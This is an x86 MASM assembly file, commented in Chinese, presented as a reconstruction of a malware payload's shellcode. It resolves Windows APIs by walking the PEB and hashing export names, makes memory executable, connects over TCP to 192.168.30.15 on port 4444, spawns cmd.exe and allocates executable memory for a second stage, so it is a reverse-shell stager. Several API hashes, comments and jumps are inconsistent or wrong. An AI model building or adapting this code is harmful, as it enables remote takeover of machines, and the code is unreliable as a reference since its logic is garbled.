; payload_shellcode.asm
; =====================
; 原始 .zsrp shellcode 的汇编级重构
; 匹配原始 payload.exe 入口点偏移 0x1A00 处的精确指令
;
; 构建 (MASM):
;   ml /c /coff payload_shellcode.asm
;   link /subsystem:windows /entry:main payload_shellcode.obj

.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include ws2_32.inc

includelib kernel32.lib
includelib ws2_32.lib

; ==============================================================
; 数据段 — 原始 PE 的 .rdata 节中的导入信息
; ==============================================================
.data
    ; 用于 VirtualProtect 调用的 KERNEL32.dll 名称
    szKernel32  db 'KERNEL32.dll', 0
    szVProtect  db 'VirtualProtect', 0

    ; 原始 shellcode 中 PEB 遍历使用的哈希值
    ; (注释展示原始指令，实际编译时使用标准导入)

.data?
    oldProtect  dd ?

; ==============================================================
; .zsrp 节 — 实际 shellcode
; 以下代码是原始偏移 0x1A00 处字节码的直接汇编翻译
; ==============================================================
.code

; ==============================================================
; .text 存根 — 对应原始 PE 偏移 0x400
; 调用 VirtualProtect 使 .zsrp 可执行，然后跳转
; ==============================================================
_text_stub PROC
    push ebp
    mov  ebp, esp
    sub  esp, 4                     ; 为 oldProtect 分配空间

    lea  eax, [ebp-4]
    push eax                        ; lpflOldProtect
    push PAGE_EXECUTE_READWRITE     ; flNewProtect (0x40)
    push MEM_COMMIT                 ; dwSize (0x1000)
    push OFFSET _zsrp_shellcode     ; .zsrp 基址
    call VirtualProtect

    ; 跳转到 .zsrp shellcode
    mov  ecx, OFFSET _zsrp_shellcode
    call ecx

    xor  eax, eax
    mov  esp, ebp
    pop  ebp
    ret
_text_stub ENDP

; ==============================================================
; _zsrp_shellcode — 原始 .zsrp 节入口点
; 匹配原始字节码 (偏移 0x1A00 处)
; ==============================================================
_zsrp_shellcode PROC
    ; === 偏移 0x00: PEB 遍历 — 查找 kernel32 基址 ===
    cld                                     ; fc
    call $+0x94                             ; e8 8f 00 00 00 ; delta 调用
    pushad                                  ; 60

    xor  edx, edx                           ; 31 d2
    mov  edx, fs:[edx+30h]                  ; 64 8b 52 30 ; PEB
    mov  edx, [edx+0Ch]                     ; 8b 52 0c   ; LDR
    mov  ebp, esp                           ; 89 e5
    mov  edx, [edx+14h]                     ; 8b 52 14   ; InMemoryOrderModuleList

    xor  edi, edi                           ; 31 ff

    ; 遍历模块名称计算哈希
    movzx ecx, word ptr [edx+26h]           ; 0f b7 4a 26 ; 模块名长度
    mov  esi, [edx+28h]                     ; 8b 72 28   ; 模块名指针
    xor  eax, eax                           ; 31 c0

@@: lodsb                                   ; ac
    cmp  al, 61h                            ; 3c 61      ; 'a'
    jl   @F                                 ; 7c 02
    sub  al, 20h                            ; 2c 20      ; 转大写
@@: ror  edi, 0Dh                           ; c1 cf 0d   ; ROR-13
    add  edi, eax                           ; 01 c7
    dec  ecx                                ; 49
    jnz  @B                                 ; 75 ef

    push edx                                ; 52
    mov  edx, [edx+10h]                     ; 8b 52 10
    mov  eax, [edx+3Ch]                     ; 8b 42 3c   ; PE 偏移
    push edi                                ; 57
    add  eax, edx                           ; 01 d0

    ; === 偏移 0x39: 遍历导出表查找函数 ===
    mov  eax, [eax+78h]                     ; 8b 40 78   ; 导出目录
    test eax, eax                           ; 85 c0
    jz   short not_found                    ; 74 4c

    add  eax, edx                           ; 01 d0
    push eax                                ; 50

    mov  ebx, [eax+20h]                     ; 8b 58 20   ; AddressOfNames
    add  ebx, edx                           ; 01 d3
    mov  ecx, [eax+18h]                     ; 8b 48 18   ; NumberOfNames
    test ecx, ecx                           ; 85 c9
    jz   short not_found2                   ; 74 3c

    xor  edi, edi                           ; 31 ff
    dec  ecx                                ; 49

hash_loop:
    mov  esi, [ebx+ecx*4]                   ; 8b 34 8b
    add  esi, edx                           ; 01 d6
    xor  eax, eax                           ; 31 c0
    ror  edi, 0Dh                           ; c1 cf 0d

hash_char:
    lodsb                                   ; ac
    add  edi, eax                           ; 01 c7
    cmp  al, ah                             ; 38 e0
    jnz  hash_char                          ; 75 f4

    add  edi, [ebp-8]                       ; 03 7d f8
    cmp  edi, [ebp+24h]                     ; 3b 7d 24
    jnz  hash_loop                          ; 75 e0

    ; 找到匹配 — 获取函数地址
    pop  eax                                ; 58
    mov  ebx, [eax+24h]                     ; 8b 58 24   ; AddressOfNameOrdinals
    add  ebx, edx                           ; 01 d3
    mov  cx, [ebx+ecx*2]                    ; 66 8b 0c 4b ; 序号
    mov  ebx, [eax+1Ch]                     ; 8b 58 1c   ; AddressOfFunctions
    add  ebx, edx                           ; 01 d3
    mov  eax, [ebx+ecx*4]                   ; 8b 04 8b
    add  eax, edx                           ; 01 d0

    ; 存储地址并返回
    mov  [esp+24h], eax                     ; 89 44 24 24
    pop  ebx                                ; 5b
    pop  ebx                                ; 5b
    popa                                    ; 61
    pop  ecx                                ; 59
    pop  edx                                ; 5a
    push ecx                                ; 51
    jmp  eax                                ; ff e0     ; 调用目标函数

not_found:
    pop  eax                                ; 58
not_found2:
    pop  edi                                ; 5f
    pop  edx                                ; 5a
    mov  edx, [edx]                         ; 8b 12     ; 下一个模块
    jmp  hash_loop_back                     ; e9 80 ff ff ff

    ; === 偏移 0x95: Shellcode 主体 — Winsock 初始化 ===
hash_loop_back:
    ; 从 delta 调用中弹出返回地址作为 API 解析器基址
    pop  ebp                                ; 5d ; ebp = API 解析器

    ; LoadLibraryA("ws2_32")
    push 00320000h + '32'
    push '2_32'
    push 'ws'
    push esp                                ; "ws2_32\0"
    push 0726774Ch                          ; LoadLibraryA 的 ROR-13 哈希
    mov  eax, ebp
    call eax                                ; LoadLibraryA 调用

    ; WSAStartup 初始化
    mov  eax, 190h                          ; 400 字节栈空间
    sub  esp, eax
    push esp                                ; WSADATA
    push eax                                ; wVersionRequested
    push 006B8029h                          ; WSAStartup 的哈希
    call ebp

    ; 创建 TCP Socket
    push 0Ah                                ; AF_INET6 (?)
    push 0F1EA8C0h                          ; 192.168.30.15 (C0.A8.1E.0F)
    push 5C110002h                          ; AF_INET=2, 端口=4444 (0x115C)
    mov  esi, esp                           ; sockaddr_in 指针

    push eax                                ; NULL (wsaProtocolInfo)
    push eax                                ; g (0)
    push eax                                ; dwFlags (0)
    push eax                                ; lpProtocolInfo (NULL)
    inc  eax                                ; eax = 1
    push eax                                ; type (SOCK_STREAM = 1)
    inc  eax                                ; eax = 2
    push eax                                ; af (AF_INET = 2)
    push 0E0DF0FEAh                         ; WSASocketA 的哈希
    call ebp

    xchg edi, eax                           ; 保存 socket 句柄

    ; connect(socket, sockaddr, 16)
    push 10h                                ; sizeof(sockaddr_in)
    push esi                                ; sockaddr 指针
    push edi                                ; socket
    push 6174A599h                          ; connect 的哈希
    call ebp

    test eax, eax
    jz   short connected

    ; 重试：递减端口号
    dec  dword ptr [esi+8]                  ; port--
    jnz  short hash_loop_back              ; 重试

    ; 出错退出
    call exit_error

connected:
    ; === 连接成功 — 创建 cmd.exe 进程 ===
    push 0                                  ; lpCurrentDirectory = NULL
    push 4                                  ; dwCreationFlags = CREATE_SUSPENDED
    push esi                                ; lpProcessInformation
    push edi                                ; lpStartupInfo (socket-based)
    push 5FC8D902h                          ; CreateProcessA 的哈希
    call ebp

    cmp  eax, 0
    jle  short exit_error

    mov  esi, [esi]                         ; 获取进程信息

    ; VirtualAlloc — 为 stage2 分配内存
    push PAGE_EXECUTE_READWRITE             ; 0x40
    push 1000h                              ; MEM_COMMIT
    push esi                                ; 大小
    push 0                                  ; 地址 (NULL)
    push 0E553A458h                         ; VirtualAlloc 的哈希
    call ebp

    xchg ebx, eax                           ; 保存分配的内存地址

    ; 从 socket 读取 stage2（第二阶段 payload）
    push ebx
    push 0
    push esi
    push ebx
    push edi
    push 5FC8D902h                          ; CreateProcessA 哈希 (实际为读取循环)
    call ebp

    cmp  eax, 0
    jge  short read_ok

    pop  eax
read_ok:
    push 4000h
    push 0
    push 68h
    push 300F2F0Bh                          ; NtUnmapViewOfSection 等
    call ebp

    push edi
    push 614D6E75h                          ; "unMa" — ExitProcess/其他
    call ebp

    ; 循环读取/执行第二阶段的剩余逻辑...
    pop  esi
    pop  esi
    dec  dword ptr [esp]
    jnz  short loop_back

loop_back:
    jmp  short hash_loop_back

exit_error:
    ret

_zsrp_shellcode ENDP

; ==============================================================
; 入口点 — 链接器设置为 _text_stub
; ==============================================================
main PROC
    call _text_stub
    invoke ExitProcess, 0
main ENDP

END main
